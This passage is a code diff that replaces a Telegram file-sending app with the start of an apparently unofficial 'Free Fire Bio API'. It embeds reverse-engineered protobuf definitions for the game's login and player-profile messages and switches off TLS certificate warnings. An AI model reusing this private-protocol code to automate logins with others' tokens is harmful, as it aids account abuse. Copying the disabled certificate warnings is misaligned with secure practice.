@@ -1,694 +1,206 @@
-# app.py - HANYA KIRIM FILE TXT KE TELEGRAM
-from flask import Flask, request, jsonify, make_response
-import requests
+"""
+FREE FIRE BIO API - FULL FEATURED
+Protobuf standalone | All endpoints preserved
+"""
+
+import asyncio
+import httpx
+import json
+import sys
+import base64
+import re
+import os
 import binascii
-import jwt
+import requests
 import urllib3
 import random
-import string
-import time
-import json
-import hashlib
-import re
 import struct
-import threading
-import ssl
-import base64
-import os
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+import hashlib
+import time
 from datetime import datetime
-from google.protobuf import descriptor as _descriptor
-from google.protobuf import descriptor_pool as _descriptor_pool
-from google.protobuf import symbol_database as _symbol_database
-from google.protobuf import runtime_version as _runtime_version
-from google.protobuf.internal import builder as _builder
-from google.protobuf.json_format import MessageToJson
+from flask import Flask, request, jsonify, make_response
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-app = Flask(__name__)
+# ==================== EMBED PROTOBUF (STANDALONE) ====================
+from google.protobuf import descriptor as _descriptor
+from google.protobuf import descriptor_pool as _descriptor_pool
+from google.protobuf import runtime_version as _runtime_version
+from google.protobuf import symbol_database as _symbol_database
+from google.protobuf.internal import builder as _builder
+from google.protobuf import json_format as _json_format
 
-# ============ PROTOBUF SETUP ============
-_sym_db = _symbol_database.Default()
+os.environ['PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION'] = 'python'
 
-_runtime_version.ValidateProtobufRuntimeVersion(
-    _runtime_version.Domain.PUBLIC, 6, 30, 0, '', 'MajorLoginRes.proto'
-)
+# FreeFire.proto
+_runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 30, 0, '', 'FreeFire.proto')
+FF_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x0e\x46reeFire.proto\"c\n\x08LoginReq\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0blogin_token\x18\x1d \x01(\t\x12\x1b\n\x13orign_platform_type\x18\x63 \x01(\t\"]\n\x10\x42lacklistInfoRes\x12\x1e\n\nban_reason\x18\x01 \x01(\x0e\x32\n.BanReason\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\r\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\r\"f\n\x0eLoginQueueInfo\x12\r\n\x05\x61llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\r\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\r\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\"\xa0\x03\n\x08LoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x04\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\x19\n\x11recommend_regions\x18\x07 \x03(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\r\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0b \x01(\r\x12$\n\tblacklist\x18\x0c \x01(\x0b\x32\x11.BlacklistInfoRes\x12#\n\nqueue_info\x18\r \x01(\x0b\x32\x0f.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x0e \x01(\t\x12\x15\n\rapp_server_id\x18\x0f \x01(\r\x12\x0f\n\x07\x61no_url\x18\x10 \x01(\t\x12\x0f\n\x07ip_city\x18\x11 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x12 \x01(\t*\xa8\x01\n\tBanReason\x12\x16\n\x12\x42\x41N_REASON_UNKNOWN\x10\x00\x12\x1b\n\x17\x42\x41N_REASON_IN_GAME_AUTO\x10\x01\x12\x15\n\x11\x42\x41N_REASON_REFUND\x10\x02\x12\x15\n\x11\x42\x41N_REASON_OTHERS\x10\x03\x12\x16\n\x12\x42\x41N_REASON_SKINMOD\x10\x04\x12 \n\x1b\x42\x41N_REASON_IN_GAME_AUTO_NEW\x10\xf6\x07\x62\x06proto3')
+_g = {}
+_builder.BuildMessageAndEnumDescriptors(FF_DESC, _g)
+_builder.BuildTopDescriptorsAndMessages(FF_DESC, 'FreeFire_pb2', _g)
+LoginReq = _g['LoginReq']
+LoginRes = _g['LoginRes']
 
-_req_desc = _descriptor_pool.Default().AddSerializedFile(
-    b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t'
-    b'\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05'
-    b'\x12\x16\n\x0eclient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t'
-    b'\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t'
-    b'\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r'
-    b'\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t'
-    b'\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r'
-    b'\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t'
-    b'\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t'
-    b'\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t'
-    b'\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0bdevice_type\x18\x18 \x01(\t'
-    b"\x12'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity"
-    b'\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05'
-    b'\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t'
-    b'\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t'
-    b'\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05'
-    b'\x12"\n\x1a\x65xternal_storage_available\x18= \x01(\x05'
-    b'\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05'
-    b'\x12"\n\x1ainternal_storage_available\x18? \x01(\x05'
-    b'\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05'
-    b'\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05'
-    b'\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05'
-    b'\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05'
-    b'\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t'
-    b'\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t'
-    b'\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05'
-    b'\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t'
-    b'\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t'
-    b'\x12\x14\n\x0cgraphics_api\x18V \x01(\t'
-    b'\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r'
-    b'\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05'
-    b'\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c'
-    b'\x12\x14\n\x0cloading_time\x18\\ \x01(\r'
-    b'\x12\x17\n\x0frelease_channel\x18] \x01(\t'
-    b'\x12\x12\n\nextra_info\x18^ \x01(\t'
-    b'\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r'
-    b'\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05'
-    b'\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t'
-    b'\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t'
-    b'"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05'
-    b'\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3'
-)
+# main.proto
+MAIN_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x0csample.proto\"*\n\x12SearchWorkshopCode\x12\t\n\x01\x61\x18\x01 \x01(\t\x12\t\n\x01\x62\x18\x02 \x01(\x05\"-\n\x15GetPlayerPersonalShow\x12\t\n\x01\x61\x18\x01 \x01(\x03\x12\t\n\x01\x62\x18\x02 \x01(\x05\x62\x06proto3')
+_g2 = {}
+_builder.BuildMessageAndEnumDescriptors(MAIN_DESC, _g2)
+_builder.BuildTopDescriptorsAndMessages(MAIN_DESC, 'main_pb2', _g2)
+GetPlayerPersonalShow = _g2['GetPlayerPersonalShow']
 
-_req_globals = {}
-_builder.BuildMessageAndEnumDescriptors(_req_desc, _req_globals)
-_builder.BuildTopDescriptorsAndMessages(_req_desc, 'MajorLoginReq_pb2', _req_globals)
-if not _descriptor._USE_C_DESCRIPTORS:
-    _req_desc._options = None
-    _req_globals['_MAJORLOGIN']._serialized_start = 24
-    _req_globals['_MAJORLOGIN']._serialized_end = 1426
-    _req_globals['_GAMESECURITY']._serialized_start = 1428
-    _req_globals['_GAMESECURITY']._serialized_end = 1481
+# AccountPersonalShow.proto
+_runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 33, 1, '', 'AccountPersonalShow.proto')
+APS_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x19\x41\x63\x63ountPersonalShow.proto\x12\x08\x66reefire\"\xa9\x02\n\x0e\x41\x63\x63ountPrefers\x12\x1a\n\rhide_my_lobby\x18\x01 \x01(\x08H\x00\x88\x01\x01\x12\x1c\n\x14pregame_show_choices\x18\x02 \x03(\r\x12\x1f\n\x17\x62r_pregame_show_choices\x18\x03 \x03(\r\x12\x1f\n\x12hide_personal_info\x18\x04 \x01(\x08H\x01\x88\x01\x01\x12$\n\x17\x64isable_friend_spectate\x18\x05 \x01(\x08H\x02\x88\x01\x01\x12\x1c\n\x0fhide_occupation\x18\x06 \x01(\x08H\x03\x88\x01\x01\x42\x10\n\x0e_hide_my_lobbyB\x15\n\x13_hide_personal_infoB\x1a\n\x18_disable_friend_spectateB\x12\n\x10_hide_occupation\"\xc4\x01\n\x10\x45xternalIconInfo\x12\x1a\n\rexternal_icon\x18\x01 \x01(\tH\x00\x88\x01\x01\x12\x31\n\x06status\x18\x02 \x01(\x0e\x32\x1c.freefire.ExternalIconStatusH\x01\x88\x01\x01\x12\x36\n\tshow_type\x18\x03 \x01(\x0e\x32\x1e.freefire.ExternalIconShowTypeH\x02\x88\x01\x01\x42\x10\n\x0e_external_iconB\t\n\x07_statusB\x0c\n\n_show_type\"\x92\x01\n\x0fSocialHighLight\x12,\n\nhigh_light\x18\x01 \x01(\x0e\x32\x13.freefire.HighLightH\x00\x88\x01\x01\x12\x16\n\texpire_at\x18\x02 \x01(\x03H\x01\x88\x01\x01\x12\x12\n\x05value\x18\x03 \x01(\rH\x02\x88\x01\x01\x42\r\n\x0b_high_lightB\x0c\n\n_expire_atB\x08\n\x06_value\"\xbb\x03\n\x14WeaponPowerTitleInfo\x12\x13\n\x06region\x18\x01 \x01(\tH\x00\x88\x01\x01\x12\x19\n\x0ctitle_cfg_id\x18\x02 \x01(\rH\x01\x88\x01\x01\x12\x1b\n\x0eleaderboard_id\x18\x03 \x01(\x04H\x02\x88\x01\x01\x12\x16\n\tweapon_id\x18\x04 \x01(\rH\x03\x88\x01\x01\x12\x11\n\x04rank\x18\x05 \x01(\rH\x04\x88\x01\x01\x12\x18\n\x0b\x65xpire_time\x18\x06 \x01(\x03H\x05\x88\x01\x01\x12\x18\n\x0breward_time\x18\x07 \x01(\x03H\x06\x88\x01\x01\x12\x17\n\nRegionName\x18\x08 \x01(\tH\x07\x88\x01\x01\x12>\n\nRegionType\x18\t \x01(\x0e\x32%.freefire.ELeaderBoardTitleRegionTypeH\x08\x88\x01\x01\x12\x11\n\x04IsBr\x18\n \x01(\x08H\t\x88\x01\x01\x42\t\n\x07_regionB\x0f\n\r_title_cfg_idB\x11\n\x0f_leaderboard_idB\x0c\n\n_weapon_idB\x07\n\x05_rankB\x0e\n\x0c_expire_timeB\x0e\n\x0c_reward_timeB\r\n\x0b_RegionNameB\r\n\x0b_RegionTypeB\x07\n\x05_IsBr\"\xc7\x02\n\x11GuildWarTitleInfo\x12\x13\n\x06region\x18\x01 \x01(\tH\x00\x88\x01\x01\x12\x14\n\x07\x63lan_id\x18\x02 \x01(\x04H\x01\x88\x01\x01\x12\x19\n\x0ctitle_cfg_id\x18\x03 \x01(\rH\x02\x88\x01\x01\x12\x1b\n\x0eleaderboard_id\x18\x04 \x01(\x04H\x03\x88\x01\x01\x12\x11\n\x04rank\x18\x05 \x01(\rH\x04\x88\x01\x01\x12\x18\n\x0b\x65xpire_time\x18\x06 \x01(\x03H\x05\x88\x01\x01\x12\x18\n\x0breward_time\x18\x07 \x01(\x03H\x06\x88\x01\x01\x12\x16\n\tclan_name\x18\x08 \x01(\tH\x07\x88\x01\x01\x42\t\n\x07_regionB\n\n\x08_clan_idB\x0f\n\r_title_cfg_idB\x11\n\x0f_leaderboard_idB\x07\n\x05_rankB\x0e\n\x0c_expire_timeB\x0e\n\x0c_reward_timeB\x0c\n\n_clan_name\"\x92\x01\n\x14LeaderboardTitleInfo\x12?\n\x17weapon_power_title_info\x18\x01 \x03(\x0b\x32\x1e.freefire.WeaponPowerTitleInfo\x12\x39\n\x14guild_war_title_info\x18\x02 \x03(\x0b\x32\x1b.freefire.GuildWarTitleInfo\"\xd5\x05\n\x0fSocialBasicInfo\x12\x17\n\naccount_id\x18\x01 \x01(\x04H\x00\x88\x01\x01\x12%\n\x06gender\x18\x02 \x01(\x0e\x32\x10.freefire.GenderH\x01\x88\x01\x01\x12)\n\x08language\x18\x03 \x01(\x0e\x32\x12.freefire.LanguageH\x02\x88\x01\x01\x12.\n\x0btime_online\x18\x04 \x01(\x0e\x32\x14.freefire.TimeOnlineH\x03\x88\x01\x01\x12.\n\x0btime_active\x18\x05 \x01(\x0e\x32\x14.freefire.TimeActiveH\x04\x88\x01\x01\x12/\n\nbattle_tag\x18\x06 \x03(\x0e\x32\x1b.freefire.PlayerBattleTagID\x12\'\n\nsocial_tag\x18\x07 \x03(\x0e\x32\x13.freefire.SocialTag\x12.\n\x0bmode_prefer\x18\x08 \x01(\x0e\x32\x14.freefire.ModePreferH\x05\x88\x01\x01\x12\x16\n\tsignature\x18\t \x01(\tH\x06\x88\x01\x01\x12*\n\trank_show\x18\n \x01(\x0e\x32\x12.freefire.RankShowH\x07\x88\x01\x01\x12\x18\n\x10\x62\x61ttle_tag_count\x18\x0b \x03(\r\x12&\n\x19signature_ban_expire_time\x18\x0c \x01(\x03H\x08\x88\x01\x01\x12?\n\x12leaderboard_titles\x18\r \x01(\x0b\x32\x1e.freefire.LeaderboardTitleInfoH\t\x88\x01\x01\x42\r\n\x0b_account_idB\t\n\x07_genderB\x0b\n\t_languageB\x0e\n\x0c_time_onlineB\x0e\n\x0c_time_activeB\x0e\n\x0c_mode_preferB\x0c\n\n_signatureB\x0c\n\n_rank_showB\x1c\n\x1a_signature_ban_expire_timeB\x15\n\x13_leaderboard_titles\"\xad\x01\n#SocialHighLightsWithSocialBasicInfo\x12\x35\n\x12social_high_lights\x18\x01 \x03(\x0b\x32\x19.freefire.SocialHighLight\x12\x39\n\x11social_basic_info\x18\x02 \x01(\x0b\x32\x19.freefire.SocialBasicInfoH\x00\x88\x01\x01\x42\x14\n\x12_social_basic_info\"\xb6\x01\n\x0eOccupationInfo\x12\x1a\n\roccupation_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x13\n\x06scores\x18\x02 \x01(\x04H\x01\x88\x01\x01\x12\x18\n\x0bproficients\x18\x03 \x01(\x04H\x02\x88\x01\x01\x12\x1a\n\rproficient_lv\x18\x04 \x01(\rH\x03\x88\x01\x01\x42\x10\n\x0e_occupation_idB\t\n\x07_scoresB\x0e\n\x0c_proficientsB\x10\n\x0e_proficient_lv\"\x98\x01\n\x14OccupationSeasonInfo\x12\x16\n\tseason_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x16\n\tgame_mode\x18\x02 \x01(\rH\x01\x88\x01\x01\x12+\n\x04info\x18\x03 \x01(\x0b\x32\x18.freefire.OccupationInfoH\x02\x88\x01\x01\x42\x0c\n\n_season_idB\x0c\n\n_game_modeB\x07\n\x05_info\"5\n\tPrimeInfo\x12\x18\n\x0bprime_level\x18\x02 \x01(\rH\x00\x88\x01\x01\x42\x0e\n\x0c_prime_level\"\xac\x17\n\x10\x41\x63\x63ountInfoBasic\x12\x17\n\naccount_id\x18\x01 \x01(\x04H\x00\x88\x01\x01\x12\x19\n\x0c\x61\x63\x63ount_type\x18\x02 \x01(\rH\x01\x88\x01\x01\x12\x15\n\x08nickname\x18\x03 \x01(\tH\x02\x88\x01\x01\x12\x18\n\x0b\x65xternal_id\x18\x04 \x01(\tH\x03\x88\x01\x01\x12\x13\n\x06region\x18\x05 \x01(\tH\x04\x88\x01\x01\x12\x12\n\x05level\x18\x06 \x01(\rH\x05\x88\x01\x01\x12\x10\n\x03\x65xp\x18\x07 \x01(\rH\x06\x88\x01\x01\x12\x1a\n\rexternal_type\x18\x08 \x01(\rH\x07\x88\x01\x01\x12\x1a\n\rexternal_name\x18\t \x01(\tH\x08\x88\x01\x01\x12\x1a\n\rexternal_icon\x18\n \x01(\tH\t\x88\x01\x01\x12\x16\n\tbanner_id\x18\x0b \x01(\rH\n\x88\x01\x01\x12\x15\n\x08head_pic\x18\x0c \x01(\rH\x0b\x88\x01\x01\x12\x16\n\tclan_name\x18\r \x01(\tH\x0c\x88\x01\x01\x12\x11\n\x04rank\x18\x0e \x01(\rH\r\x88\x01\x01\x12\x1b\n\x0eranking_points\x18\x0f \x01(\rH\x0e\x88\x01\x01\x12\x11\n\x04role\x18\x10 \x01(\rH\x0f\x88\x01\x01\x12\x1b\n\x0ehas_elite_pass\x18\x11 \x01(\x08H\x10\x88\x01\x01\x12\x16\n\tbadge_cnt\x18\x12 \x01(\rH\x11\x88\x01\x01\x12\x15\n\x08\x62\x61\x64ge_id\x18\x13 \x01(\rH\x12\x88\x01\x01\x12\x16\n\tseason_id\x18\x14 \x01(\rH\x13\x88\x01\x01\x12\x12\n\x05liked\x18\x15 \x01(\rH\x14\x88\x01\x01\x12\x17\n\nis_deleted\x18\x16 \x01(\x08H\x15\x88\x01\x01\x12\x16\n\tshow_rank\x18\x17 \x01(\x08H\x16\x88\x01\x01\x12\x1a\n\rlast_login_at\x18\x18 \x01(\x03H\x17\x88\x01\x01\x12\x19\n\x0c\x65xternal_uid\x18\x19 \x01(\x04H\x18\x88\x01\x01\x12\x16\n\treturn_at\x18\x1a \x01(\x03H\x19\x88\x01\x01\x12#\n\x16\x63hampionship_team_name\x18\x1b \x01(\tH\x1a\x88\x01\x01\x12)\n\x1c\x63hampionship_team_member_num\x18\x1c \x01(\rH\x1b\x88\x01\x01\x12!\n\x14\x63hampionship_team_id\x18\x1d \x01(\x04H\x1c\x88\x01\x01\x12\x14\n\x07\x63s_rank\x18\x1e \x01(\rH\x1d\x88\x01\x01\x12\x1e\n\x11\x63s_ranking_points\x18\x1f \x01(\rH\x1e\x88\x01\x01\x12\x19\n\x11weapon_skin_shows\x18  \x03(\r\x12\x13\n\x06pin_id\x18! \x01(\rH\x1f\x88\x01\x01\x12\x1e\n\x11is_cs_ranking_ban\x18\" \x01(\x08H \x88\x01\x01\x12\x15\n\x08max_rank\x18# \x01(\rH!\x88\x01\x01\x12\x18\n\x0b\x63s_max_rank\x18$ \x01(\rH\"\x88\x01\x01\x12\x1f\n\x12max_ranking_points\x18% \x01(\rH#\x88\x01\x01\x12\x1a\n\rgame_bag_show\x18& \x01(\rH$\x88\x01\x01\x12\x1a\n\rpeak_rank_pos\x18\' \x01(\rH%\x88\x01\x01\x12\x1d\n\x10\x63s_peak_rank_pos\x18( \x01(\rH&\x88\x01\x01\x12\x36\n\x0f\x61\x63\x63ount_prefers\x18) \x01(\x0b\x32\x18.freefire.AccountPrefersH\'\x88\x01\x01\x12$\n\x17periodic_ranking_points\x18* \x01(\rH(\x88\x01\x01\x12\x1a\n\rperiodic_rank\x18+ \x01(\rH)\x88\x01\x01\x12\x16\n\tcreate_at\x18, \x01(\x03H*\x88\x01\x01\x12?\n\x16veteran_leave_days_tag\x18- \x01(\x0e\x32\x1a.freefire.VeteranLeaveDaysH+\x88\x01\x01\x12\x1b\n\x13selected_item_slots\x18. \x03(\r\x12=\n\x10pre_veteran_type\x18/ \x01(\x0e\x32\x1e.freefire.PreVeteranActionTypeH,\x88\x01\x01\x12\x12\n\x05title\x18\x30 \x01(\rH-\x88\x01\x01\x12;\n\x12\x65xternal_icon_info\x18\x31 \x01(\x0b\x32\x1a.freefire.ExternalIconInfoH.\x88\x01\x01\x12\x1c\n\x0frelease_version\x18\x32 \x01(\tH/\x88\x01\x01\x12 \n\x13veteran_expire_time\x18\x33 \x01(\x04H0\x88\x01\x01\x12\x19\n\x0cshow_br_rank\x18\x34 \x01(\x08H1\x88\x01\x01\x12\x19\n\x0cshow_cs_rank\x18\x35 \x01(\x08H2\x88\x01\x01\x12\x14\n\x07\x63lan_id\x18\x36 \x01(\x04H3\x88\x01\x01\x12\x1a\n\rclan_badge_id\x18\x37 \x01(\rH4\x88\x01\x01\x12\x1e\n\x11\x63ustom_clan_badge\x18\x38 \x01(\tH5\x88\x01\x01\x12\"\n\x15use_custom_clan_badge\x18\x39 \x01(\x08H6\x88\x01\x01\x12\x1a\n\rclan_frame_id\x18: \x01(\rH7\x88\x01\x01\x12\x1d\n\x10membership_state\x18; \x01(\x08H8\x88\x01\x01\x12:\n\x12select_occupations\x18< \x03(\x0b\x32\x1e.freefire.OccupationSeasonInfo\x12^\n\"social_high_lights_with_basic_info\x18= \x01(\x0b\x32-.freefire.SocialHighLightsWithSocialBasicInfoH9\x88\x01\x01\x12,\n\nprime_info\x18L \x01(\x0b\x32\x13.freefire.PrimeInfoH:\x88\x01\x01\x42\r\n\x0b_account_idB\x0f\n\r_account_typeB\x0b\n\t_nicknameB\x0e\n\x0c_external_idB\t\n\x07_regionB\x08\n\x06_levelB\x06\n\x04_expB\x10\n\x0e_external_typeB\x10\n\x0e_external_nameB\x10\n\x0e_external_iconB\x0c\n\n_banner_idB\x0b\n\t_head_picB\x0c\n\n_clan_nameB\x07\n\x05_rankB\x11\n\x0f_ranking_pointsB\x07\n\x05_roleB\x11\n\x0f_has_elite_passB\x0c\n\n_badge_cntB\x0b\n\t_badge_idB\x0c\n\n_season_idB\x08\n\x06_likedB\r\n\x0b_is_deletedB\x0c\n\n_show_rankB\x10\n\x0e_last_login_atB\x0f\n\r_external_uidB\x0c\n\n_return_atB\x19\n\x17_championship_team_nameB\x1f\n\x1d_championship_team_member_numB\x17\n\x15_championship_team_idB\n\n\x08_cs_rankB\x14\n\x12_cs_ranking_pointsB\t\n\x07_pin_idB\x14\n\x12_is_cs_ranking_banB\x0b\n\t_max_rankB\x0e\n\x0c_cs_max_rankB\x15\n\x13_max_ranking_pointsB\x10\n\x0e_game_bag_showB\x10\n\x0e_peak_rank_posB\x13\n\x11_cs_peak_rank_posB\x12\n\x10_account_prefersB\x1a\n\x18_periodic_ranking_pointsB\x10\n\x0e_periodic_rankB\x0c\n\n_create_atB\x19\n\x17_veteran_leave_days_tagB\x13\n\x11_pre_veteran_typeB\x08\n\x06_titleB\x15\n\x13_external_icon_infoB\x12\n\x10_release_versionB\x16\n\x14_veteran_expire_timeB\x0f\n\r_show_br_rankB\x0f\n\r_show_cs_rankB\n\n\x08_clan_idB\x10\n\x0e_clan_badge_idB\x14\n\x12_custom_clan_badgeB\x18\n\x16_use_custom_clan_badgeB\x10\n\x0e_clan_frame_idB\x13\n\x11_membership_stateB%\n#_social_high_lights_with_basic_infoB\r\n\x0b_prime_info\"\x9a\x01\n\x0f\x41vatarSkillSlot\x12\x14\n\x07slot_id\x18\x01 \x01(\x04H\x00\x88\x01\x01\x12\x15\n\x08skill_id\x18\x02 \x01(\x04H\x01\x88\x01\x01\x12\x30\n\x0c\x65quip_source\x18\x03 \x01(\x0e\x32\x15.freefire.EquipSourceH\x02\x88\x01\x01\x42\n\n\x08_slot_idB\x0b\n\t_skill_idB\x0f\n\r_equip_source\"\x98\x05\n\rAvatarProfile\x12\x16\n\tavatar_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x17\n\nskin_color\x18\x03 \x01(\rH\x01\x88\x01\x01\x12\x0f\n\x07\x63lothes\x18\x04 \x03(\r\x12\x16\n\x0e\x65quiped_skills\x18\x05 \x03(\r\x12\x18\n\x0bis_selected\x18\x06 \x01(\x08H\x02\x88\x01\x01\x12\x1f\n\x12pve_primary_weapon\x18\x07 \x01(\rH\x03\x88\x01\x01\x12\x1f\n\x12is_selected_awaken\x18\x08 \x01(\x08H\x04\x88\x01\x01\x12\x15\n\x08\x65nd_time\x18\t \x01(\rH\x05\x88\x01\x01\x12.\n\x0bunlock_type\x18\n \x01(\x0e\x32\x14.freefire.UnlockTypeH\x06\x88\x01\x01\x12\x18\n\x0bunlock_time\x18\x0b \x01(\rH\x07\x88\x01\x01\x12\x1b\n\x0eis_marked_star\x18\x0c \x01(\x08H\x08\x88\x01\x01\x12\x1e\n\x16\x63lothes_tailor_effects\x18\r \x03(\r\x12\x10\n\x03top\x18\x0e \x01(\rH\t\x88\x01\x01\x12\x13\n\x06\x62ottom\x18\x0f \x01(\rH\n\x88\x01\x01\x12\x11\n\x04mask\x18\x10 \x01(\rH\x0b\x88\x01\x01\x12\x16\n\tfacepaint\x18\x11 \x01(\rH\x0c\x88\x01\x01\x12\x12\n\x05shoes\x18\x12 \x01(\rH\r\x88\x01\x01\x42\x0c\n\n_avatar_idB\r\n\x0b_skin_colorB\x0e\n\x0c_is_selectedB\x15\n\x13_pve_primary_weaponB\x15\n\x13_is_selected_awakenB\x0b\n\t_end_timeB\x0e\n\x0c_unlock_typeB\x0e\n\x0c_unlock_timeB\x11\n\x0f_is_marked_starB\x06\n\x04_topB\t\n\x07_bottomB\x07\n\x05_maskB\x0c\n\n_facepaintB\x08\n\x06_shoes\"\xd8\x02\n\x12\x41\x63\x63ountNewsContent\x12\x10\n\x08item_ids\x18\x01 \x03(\r\x12\x11\n\x04rank\x18\x02 \x01(\rH\x00\x88\x01\x01\x12\x17\n\nmatch_mode\x18\x03 \x01(\rH\x01\x88\x01\x01\x12\x13\n\x06map_id\x18\x04 \x01(\rH\x02\x88\x01\x01\x12\x16\n\tgame_mode\x18\x05 \x01(\rH\x03\x88\x01\x01\x12\x17\n\ngroup_mode\x18\x06 \x01(\rH\x04\x88\x01\x01\x12\x1b\n\x0etreasurebox_id\x18\x07 \x01(\rH\x05\x88\x01\x01\x12\x19\n\x0c\x63ommodity_id\x18\x08 \x01(\rH\x06\x88\x01\x01\x12\x15\n\x08store_id\x18\t \x01(\rH\x07\x88\x01\x01\x42\x07\n\x05_rankB\r\n\x0b_match_modeB\t\n\x07_map_idB\x0c\n\n_game_modeB\r\n\x0b_group_modeB\x11\n\x0f_treasurebox_idB\x0f\n\r_commodity_idB\x0b\n\t_store_id\"\xa7\x01\n\x0b\x41\x63\x63ountNews\x12%\n\x04type\x18\x01 \x01(\x0e\x32\x12.freefire.NewsTypeH\x00\x88\x01\x01\x12\x32\n\x07\x63ontent\x18\x02 \x01(\x0b\x32\x1c.freefire.AccountNewsContentH\x01\x88\x01\x01\x12\x18\n\x0bupdate_time\x18\x03 \x01(\x03H\x02\x88\x01\x01\x42\x07\n\x05_typeB\n\n\x08_contentB\x0e\n\x0c_update_time\"\x99\x02\n\x0b\x42\x61sicEPInfo\x12\x18\n\x0b\x65p_event_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x17\n\nowned_pass\x18\x02 \x01(\x08H\x01\x88\x01\x01\x12\x15\n\x08\x65p_badge\x18\x03 \x01(\rH\x02\x88\x01\x01\x12\x16\n\tbadge_cnt\x18\x04 \x01(\rH\x03\x88\x01\x01\x12\x14\n\x07\x62p_icon\x18\x05 \x01(\tH\x04\x88\x01\x01\x12\x16\n\tmax_level\x18\x06 \x01(\rH\x05\x88\x01\x01\x12\x17\n\nevent_name\x18\x07 \x01(\tH\x06\x88\x01\x01\x42\x0e\n\x0c_ep_event_idB\r\n\x0b_owned_passB\x0b\n\t_ep_badgeB\x0c\n\n_badge_cntB\n\n\x08_bp_iconB\x0c\n\n_max_levelB\r\n\x0b_event_name\"\x9d\x02\n\rClanInfoBasic\x12\x14\n\x07\x63lan_id\x18\x01 \x01(\x04H\x00\x88\x01\x01\x12\x16\n\tclan_name\x18\x02 \x01(\tH\x01\x88\x01\x01\x12\x17\n\ncaptain_id\x18\x03 \x01(\x04H\x02\x88\x01\x01\x12\x17\n\nclan_level\x18\x04 \x01(\rH\x03\x88\x01\x01\x12\x15\n\x08\x63\x61pacity\x18\x05 \x01(\rH\x04\x88\x01\x01\x12\x17\n\nmember_num\x18\x06 \x01(\rH\x05\x88\x01\x01\x12\x18\n\x0bhonor_point\x18\x07 